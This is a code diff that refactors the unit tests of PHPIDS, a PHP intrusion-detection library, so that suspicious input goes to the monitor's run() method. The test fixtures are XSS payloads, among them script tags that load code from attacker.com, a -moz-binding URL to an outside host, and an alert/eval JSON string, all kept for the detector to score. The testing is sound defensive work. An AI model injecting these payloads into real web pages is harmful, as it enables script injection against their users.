@@ -40,7 +40,6 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
     public function testGetHTML()
     {
         $test = new Monitor(
-            array('user' => 'admin<script/src=http/attacker.com>'),
             $this->init,
             array('csrf')
         );
@@ -51,7 +50,6 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
     public function testGetStorage()
     {
         $test = new Monitor(
-            array('user' => 'admin<script/src=http/attacker.com>'),
             $this->init
         );
         $this->assertInstanceOf('IDS\Filter\Storage', $test->getStorage());
@@ -60,12 +58,11 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
     public function testRunWithTags()
     {
         $test = new Monitor(
-            array('user' => 'admin<script/src=http/attacker.com>'),
             $this->init,
             array('csrf')
         );
 
-        $result = $test->run();
+        $result = $test->run(array('user' => 'admin<script/src=http/attacker.com>'));
 
         foreach ($result->getEvent('user')->getFilters() as $filter) {
             $this->assertTrue(in_array('csrf', $filter->getTags()));
@@ -75,26 +72,25 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
     public function testRun()
     {
         $test = new Monitor(
-            array(
-                'id'    => '9<script/src=http/attacker.com>',
-                'name'  => '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
-            ),
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run(array(
+            'id'   => '9<script/src=http/attacker.com>',
+            'name' => '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
+        ));
         $this->assertTrue($result->hasEvent('id'));
         $this->assertTrue($result->hasEvent('name'));
     }
 
     public function testNoResult()
     {
-        $test = new Monitor(array('test', 'bla'), $this->init);
-        $this->assertTrue($test->run()->isEmpty());
+        $test = new Monitor($this->init);
+        $this->assertTrue($test->run(array('test', 'bla'))->isEmpty());
     }
 
     public function testSetExceptionsString()
     {
-        $test = new Monitor(array('test', 'bla'), $this->init);
+        $test = new Monitor($this->init);
         $exception = 'test1';
         $test->setExceptions($exception);
         $result = $test->getExceptions();
@@ -103,7 +99,7 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
 
     public function testSetExceptionsArray()
     {
-        $test = new Monitor(array('test', 'bla'), $this->init);
+        $test = new Monitor($this->init);
         $exceptions = array('test1', 'test2');
         $test->setExceptions($exceptions);
         $this->assertEquals($exceptions, $test->getExceptions());
@@ -112,13 +108,12 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
     public function testList()
     {
         $test = new Monitor(
-            array(
-                '9<script/src=http/attacker.com>',
-                '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
-            ),
             $this->init
         );
-        $this->assertEquals(33, $test->run()->getImpact());
+        $this->assertEquals(33, $test->run(array(
+            '9<script/src=http/attacker.com>',
+            '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
+        ))->getImpact());
     }
 
     public function testListWithKeyScanning()
@@ -130,11 +125,10 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits['8<script/src=http/attacker.com>'] = 'abc';
         $exploits['9<script/src=http/attacker.com>'] = '';
         $test = new Monitor(
-            $exploits,
             $this->init
         );
         $test->scanKeys = true;
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(57, $result->getImpact());
     }
 
@@ -145,14 +139,13 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits['scanme.2'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
         $exploits['ignoreme'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
         $test = new Monitor(
-            $exploits,
             $this->init
         );
 
         $exceptions = array('ignoreme');
         $test->setExceptions($exceptions);
 
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(33, $result->getImpact());
     }
 
@@ -163,14 +156,13 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits['scanme.2'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
         $exploits['ignoreme'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
         $test = new Monitor(
-            $exploits,
             $this->init
         );
 
         $exceptions = array('/.*oreme$/im');
         $test->setExceptions($exceptions);
 
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(33, $result->getImpact());
     }
 
@@ -180,10 +172,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
         $exploits[] = array('9<script/src=http/attacker.com>');
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(41, $result->getImpact());
     }
 
@@ -193,11 +184,10 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
         $exploits[] = array('9<script/src=http/attacker.com>');
         $test = new Monitor(
-            $exploits,
             $this->init
         );
         $test->setExceptions('test1');
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(33, $result->getImpact());
     }
 
@@ -213,10 +203,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(33, $result->getImpact());
     }
 
@@ -229,10 +218,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(9, $result->getImpact());
     }
 
@@ -299,10 +287,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(1135, $result->getImpact());
     }
 
@@ -476,10 +463,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(995, $result->getImpact());
     }
 
@@ -499,10 +485,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(157, $result->getImpact());
     }
 
@@ -517,10 +502,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(87, $result->getImpact());
     }
 
@@ -621,10 +605,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(965, $result->getImpact());
     }
 
@@ -670,10 +653,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(578, $result->getImpact());
     }
 
@@ -729,10 +711,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(535, $result->getImpact());
     }
 
@@ -790,10 +771,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(691, $result->getImpact());
     }
 
@@ -839,10 +819,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(689, $result->getImpact());
     }
 
@@ -901,10 +880,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(879, $result->getImpact());
     }
 
@@ -977,10 +955,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(891, $result->getImpact());
     }
 
@@ -1064,10 +1041,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(876, $result->getImpact());
     }
 
@@ -1121,10 +1097,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(126, $result->getImpact());
     }
 
@@ -1142,10 +1117,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(154, $result->getImpact());
     }
 
@@ -1204,10 +1178,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(533, $result->getImpact());
     }
 
@@ -1223,10 +1196,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(99, $result->getImpact());
     }
 
@@ -1240,10 +1212,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(68, $result->getImpact());
     }
 
@@ -1256,10 +1227,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(72, $result->getImpact());
     }
 
@@ -1280,10 +1250,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(48, $result->getImpact());
     }
 
@@ -1314,10 +1283,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(109, $result->getImpact());
     }
 
@@ -1331,10 +1299,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(20, $result->getImpact());
     }
 
@@ -1369,11 +1336,10 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $this->_testForPlainEvent($exploits);
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
         $test->setHtml(array_keys($exploits));
-        $result = $test->run();
+        $result = $test->run($exploits);
 
         $this->assertFalse($result->hasEvent(1));
         $this->assertEquals(711, $result->getImpact());
@@ -1407,11 +1373,10 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
 
         $this->init->config['General']['HTML_Purifier_Cache'] = IDS_TEMP_DIR;
         $test = new Monitor(
-            $exploits,
             $this->init
         );
         $test->setHtml(array_keys($exploits));
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertFalse($result->hasEvent(1));
         $this->assertEquals(0, $result->getImpact());
     }
@@ -1421,11 +1386,10 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits = array();
         $exploits['json_1'] = '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}';
         $test = new Monitor(
-            $exploits,
             $this->init
         );
         $test->setJson(array_keys($exploits));
-        $result = $test->run();
+        $result = $test->run($exploits);
         $this->assertEquals(32, $result->getImpact());
     }
 
@@ -1492,10 +1456,9 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         $exploits[] = '[CS]v1|267135E1851D3753-6000013720017F11[CE] /catalog/rss-new.php';
 
         $test = new Monitor(
-            $exploits,
             $this->init
         );
-        $result = $test->run();
+        $result = $test->run($exploits);
 
         $this->assertFalse($result->hasEvent(1));
         $this->assertEquals(0, $result->getImpact());
@@ -1513,7 +1476,6 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
         foreach ($exploits as $key => $value) {
 
             $test = new Monitor(
-                array('test' => $value),
                 $this->init
             );
 
@@ -1521,7 +1483,7 @@ class MonitorTest extends \PHPUnit_Framework_TestCase
                 $this->init->config['General']['HTML_Purifier_Cache'] = IDS_TEMP_DIR;
                 $test->setHtml(array('test'));
             }
-            $result = $test->run();
+            $result = $test->run(array('test' => $value));
 
             if ($result->getImpact() === 0) {
                 echo "\n\nNot detected: ".$value."\n\n";
